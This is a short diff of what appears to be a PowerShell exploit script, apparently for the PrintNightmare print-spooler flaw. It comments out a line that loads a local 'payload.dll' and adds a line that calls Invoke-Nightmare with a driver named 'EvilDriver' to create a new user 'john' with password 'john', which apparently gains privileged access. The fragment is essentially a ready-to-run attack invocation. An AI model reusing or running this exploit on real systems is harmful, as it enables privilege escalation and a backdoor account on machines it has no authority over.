@@ -797,5 +797,5 @@ New-Struct. :P
     $StructBuilder.CreateType()
 }
 
-
-Invoke-Nightmare -DLL "$PWD\payload.dll"
+Invoke-Nightmare -DriverName "EvilDriver" -NewUser "john" -NewPassword "john" 
+# Invoke-Nightmare -DLL "$PWD\payload.dll"
